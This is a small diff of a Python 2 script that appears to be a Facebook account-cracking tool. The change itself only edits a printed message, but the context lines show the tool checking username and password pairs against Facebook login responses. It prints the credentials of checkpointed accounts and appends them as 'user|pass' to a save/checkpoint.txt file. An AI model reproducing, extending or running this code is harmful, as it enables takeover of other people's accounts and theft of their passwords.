@@ -312,7 +312,7 @@ def action():
                 okb.close()
                 oks.append(c + user + c + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;96m[CP-BHT-CHECKPOINT] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Login After 07 Days]\n'
+                print '\x1b[1;96m[CP-BHT-CHECKPOINT] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Login After 7 Days]\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + c + pass1 + '\n')
                 cps.close()
